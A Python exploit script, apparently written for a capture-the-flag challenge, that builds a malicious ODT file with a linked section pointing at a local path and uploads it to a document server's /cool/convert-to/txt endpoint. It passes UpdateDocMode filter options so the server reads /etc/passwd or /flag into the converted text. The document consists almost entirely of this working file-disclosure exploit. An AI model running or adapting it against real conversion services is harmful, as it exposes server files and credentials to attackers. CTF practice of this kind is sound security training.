#!/usr/bin/env python3
"""Temporary CTF ODT type-detection and link-update probe."""
import io
import pathlib
import urllib.error
import urllib.request
import uuid
import zipfile

BASE = "http://njwqato3tpdz0t6k.instances.ctfcup.online"
POC = pathlib.Path(__file__).with_name("poc.odt")


def payload(target):
    out = io.BytesIO()
    with zipfile.ZipFile(POC) as zin, zipfile.ZipFile(out, "w") as zout:
        for info in zin.infolist():
            data = zin.read(info.filename)
            if info.filename == "content.xml":
                data = data.replace(b"file:///etc/passwd", b"file://" + target.encode())
                data = data.replace(b"<text:section", b"<text:p>ARENA_MARKER</text:p><text:section", 1)
            zout.writestr(info, data)
    return out.getvalue()


def convert(filename, target, fields=None):
    data = payload(target)
    boundary = "----Arena" + uuid.uuid4().hex
    prefix = b""
    for name, value in (fields or {}).items():
        prefix += f'--{boundary}\r\nContent-Disposition: form-data; name="{name}"\r\n\r\n{value}\r\n'.encode()
    body = prefix + (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="data"; filename="{filename}"\r\n'
        "Content-Type: application/octet-stream\r\n\r\n"
    ).encode() + data + f"\r\n--{boundary}--\r\n".encode()
    req = urllib.request.Request(BASE + "/cool/convert-to/txt", data=body, method="POST")
    req.add_header("Content-Type", "multipart/form-data; boundary=" + boundary)
    print("\n=== CONVERT", filename, target, fields, flush=True)
    try:
        with urllib.request.urlopen(req, timeout=90) as r:
            raw = r.read(500000)
            print("STATUS", r.status, "BYTES", len(raw), "RESPONSE", raw.decode("utf-8", "replace"), flush=True)
    except urllib.error.HTTPError as e:
        print("HTTP_ERROR", e.code, e.read(200000).decode("utf-8", "replace"), flush=True)
    except Exception as e:
        print("ERROR", repr(e), flush=True)


convert("probe.odt", "/etc/passwd")
convert("probe.txt", "/etc/passwd")
convert("probe.txt", "/etc/passwd", {"infilterOptions": "UpdateDocMode=1"})
convert("probe.txt", "/etc/passwd", {"infilterOptions": '{"UpdateDocMode":{"type":"short","value":"1"}}'})
convert("probe.odt", "/etc/passwd", {"infilterOptions": '{"UpdateDocMode":{"type":"short","value":"1"}}'})
convert("probe.txt", "/flag", {"infilterOptions": '{"UpdateDocMode":{"type":"short","value":"1"}}'})
